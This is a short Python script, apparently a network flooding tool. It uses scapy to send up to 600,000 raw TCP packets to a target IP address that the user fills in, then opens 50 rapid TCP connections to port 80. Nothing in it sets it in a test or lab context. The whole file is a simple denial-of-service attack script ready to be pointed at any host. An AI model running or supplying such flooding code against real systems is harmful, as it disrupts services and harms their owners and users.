import sys
import time
import socket
from scapy.all import Ether, IP, TCP, sendp

TARGET_IP = ""  # Replace with the target IP address
INTERFACE = ""  # Replace with your network interface
NUM_PACKETS = 600000
DURATION = 5
NUM_CONNECTIONS = 50
TARGET_PORT = 80
def send_packets(target_ip, interface, num_packets, duration):
    packet = Ether() / IP(dst=target_ip) / TCP()
    end_time = time.time() + duration
    packet_count = 0

    while time.time() < end_time and packet_count < num_packets:
        sendp(packet, iface=interface)
        packet_count += 1

def create_connections(target_ip, target_port, num_connections):
    for _ in range(num_connections):
        try: 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect((target_ip, target_port))
            s.close()
        except:
            pass    

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        print("This script requires Python 3.")
        sys.exit(1)

    send_packets(TARGET_IP, INTERFACE, NUM_PACKETS, DURATION)
    create_connections(TARGET_IP, TARGET_PORT, NUM_CONNECTIONS)